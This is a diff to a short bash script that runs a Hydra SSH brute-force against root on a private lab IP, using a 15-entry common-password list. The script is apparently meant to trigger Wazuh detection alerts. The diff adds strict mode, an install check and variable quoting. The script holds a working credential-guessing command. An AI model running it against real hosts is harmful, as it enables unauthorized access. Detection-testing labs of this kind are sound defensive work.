@@ -5,17 +5,25 @@
 # Description: Simulates an SSH Brute-force attack using Hydra
 # =====================================================================
 
+set -euo pipefail
+
 TARGET_IP="192.168.117.131" # Change this to your Target IP
 USERNAME="root"
 WORDLIST="pass15.txt"
 
-echo "[+] Creating a quick 15-line password dictionary..."
-echo -e "123456\npassword\n12345678\nqwerty\n123456789\n12345\n1234\n111111\n1234567\ndragon\n123123\nbaseball\nabc123\nfootball\nmonkey" > $WORDLIST
+if ! command -v hydra >/dev/null 2>&1; then
+    echo "[!] Hydra is required on Kali. Install it with: sudo apt install -y hydra" >&2
+    exit 1
+fi
+
+echo "[+] Creating the 15-entry dictionary from the latest screenshot..."
+printf '%s\n' 123456 password 12345678 qwerty 123456789 12345 1234 111111 \
+    1234567 dragon 123123 baseball abc123 football monkey > "$WORDLIST"
 
 echo "[+] Starting SSH Brute-force simulation against $TARGET_IP..."
 echo "[+] Using wordlist: $WORDLIST"
 
-# Run Hydra (-t 2 for 2 threads to prevent connection drop, -I to ignore restore file)
-hydra -l $USERNAME -P $WORDLIST ssh://$TARGET_IP -t 2 -I
+# Match the final completed run: two concurrent tasks; ignore a restore file.
+hydra -l "$USERNAME" -P "$WORDLIST" "ssh://$TARGET_IP" -t 2 -I
 
-echo "[+] Attack simulation completed. Check Wazuh Dashboard for alerts."
+echo "[+] Simulation finished. Read Hydra's result and inspect the Wazuh alerts."
